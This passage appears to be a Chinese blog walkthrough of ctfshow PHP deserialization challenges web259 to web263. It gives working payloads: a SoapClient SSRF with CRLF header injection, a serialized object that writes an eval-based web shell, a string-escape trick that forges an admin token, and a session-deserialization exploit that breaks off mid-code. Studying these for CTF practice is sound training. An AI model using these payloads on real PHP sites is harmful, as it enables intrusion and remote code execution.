invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目在这, 说是原生类反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><blockquote><p>虽然<code>getFlag()</code>是未知的, 但是在php特性中, 如果调用一个未知的方法, 那么他会调用<code>__call()</code>魔术方法</p><p>本地测试需要在php拓展中打开soap拓展</p></blockquote><p><a href="https://blog.csdn.net/Yuppie001/article/details/139865505?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172438446316800207036674%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172438446316800207036674&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-139865505-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=web259&amp;spm=1018.2226.3001.4187">参考1</a>, <a href="https://zhuanlan.zhihu.com/p/80918004">参考2</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;bbb&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">not_exists_function</span>();</span><br><span class="line"><span class="comment">// 测试下正常情况下的SoapClient类, 调用一个不存在的函数, 会去调用__call方法, 导致发包</span></span><br><span class="line"><span class="comment">// 监听5555端口即可抓到请求包内容</span></span><br></pre></td></tr></table></figure><p>从服务器中获取<code>HTTP_X_FORWARDED_FOR</code>头部并分割为数组, 并移除最后一个元素两次, 这实际上将<code>$ip</code>设置为原始列表中倒数第二个IP地址</p><p>当ip为<code>127.0.0.1</code>并且满足token等于ctfshow时会将将<code>$flag</code>变量写入到flag.txt文件中</p><p>本地测试可以构造如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9999/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9999/flag.php&#x27;</span>));</span><br><span class="line"><span class="variable">$client</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p><code>uri</code>是命名空间URI, 它在SOAP消息中用于标识服务; URI通常不会指向实际的资源, 而是用来标识命名空间。<code>location</code>是实际的服务端点URL, 即SOAP请求将发送到的服务器地址<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240823163856099.png" alt="image-20240823163856099"></p><p>我们可以控制的是UA头, 我们可以利用换行符顶替下面的包内容</p><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;ctfshow\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span> , <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br><span class="line"><span class="comment">// O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A131%3A%22ctfshow%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><p>执行完后访问flag.txt即可</p><blockquote><p>如果发现不行可能是复制序列化结果多复制了浏览器的换行符, 查看源代码后再复制即可</p></blockquote><p>附录:</p><p>更改为本地测试可以得到包如下, 在读取完<code>Content-Length: 13</code>, 有效包到<code>token=ctfshow</code>就结束了</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240823165742681.png" alt="image-20240823165742681"></p><h2 id="web260"><a class="header-anchor" href="#web260">¶</a>web260</h2><ul><li>描述: 无</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考的是字符串序列化后是自己本身, 那就直接提交这个字符串就可以了</p><h2 id="web261"><a class="header-anchor" href="#web261">¶</a>web261</h2><ul><li>描述: 打Redis?</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><ol><li>弱类型比较, 传入的code可以是877等</li><li>php版本为7.4.16, 存在 <code>__unserialize()</code>函数就不会再触发<code>__wakeup</code></li><li><code>__sleep</code>和<code>__invoke</code>触发似乎不太可能, 跳过, 只能用<code>__destruct</code>了</li><li>可以利用<code>file_put_contents</code>写文件</li></ol><p>既然是弱比较, 我的username是<code>877.php</code>不过分吧, 结合上面内容, 那就是利用<code>__destruct</code>里面的<code>file_put_contents</code>写马了</p><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$p</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;877.php&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>()));</span><br><span class="line"><span class="comment">// O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><p>然后访问877.php执行命令即可</p><h2 id="web262"><a class="header-anchor" href="#web262">¶</a>web262</h2><ul><li>描述: 无</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>反序列化字符串逃逸, 还是字符增多的情况</p><blockquote><p>我没做过, 觉得啰嗦就直接跳到下一题往上翻</p></blockquote><p>注意题目注释里给的<code>message.php</code>:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="非预期解"><a class="header-anchor" href="#非预期解">¶</a>非预期解</h3><p>非预期是抓包直接传入修改过的cookie即可拿到flag</p><h3 id="预期解"><a class="header-anchor" href="#预期解">¶</a>预期解</h3><p>一步一步来, 首先构造未过滤和已过滤, 然后构造payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="variable">$msg</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;fuck&#x27;</span>);</span><br><span class="line">    <span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ser</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$fil</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$ser</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fil</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    未过滤 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:4:&quot;fuck&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span></span><br><span class="line"><span class="comment">    有过滤 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:4:&quot;loveU&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span></span><br><span class="line"><span class="comment">    成功逃逸了一个字符, 根据题目, 目标是将token设置为admin</span></span><br><span class="line"><span class="comment">    payload一共27个字符: &quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line"><span class="comment">    所以需要替换27次全部逃逸出去</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="variable">$msg1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$ser1</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg1</span>);</span><br><span class="line">    <span class="variable">$fil1</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$ser1</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fil1</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    成功序列化, 尝试反序列化, 发现已经成功地将token值变为admin</span></span><br><span class="line"><span class="comment">    O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$fil1</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$obj</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240823205205086.png" alt="image-20240823205205086"></p><p>所以payload如下, 然后访问message.php得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=1&amp;m=2&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="web263"><a class="header-anchor" href="#web263">¶</a>web263</h2><ul><li>描述: 无</li></ul><p>登录界面, 目录扫描后发现有备份文件泄露<code>www.zip</code>, 有用的文件<code>index.php</code>, 只取部分</p><blockquote><p>源码写了: 密码必须为128位大小写字母+数字+特殊符号, 防止爆破</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//超过5次禁止登陆</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>limit打错了, 登录失败限制不存在, 一定会执行后面内容, 等同于我们可以通过cookie控制session</p><p>再结合<code>check.php</code>中引入的<code>inc.php</code>文件中存在如下命令, 猜测默认使用的是php_serialize</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>那就是session反序列化漏洞, <a href="https://www.jb51.net/article/116246.htm">相关讲解</a></p><p>而且在<code>inc.php</code>中还有可以用于写木马的函数:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以利用路径大概如下:</p><p>构造的session-&gt;base64_decode-&gt;cookie序列化-&gt;反序列化-&gt;file_put_contents-&gt;log1.php</p><p>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span 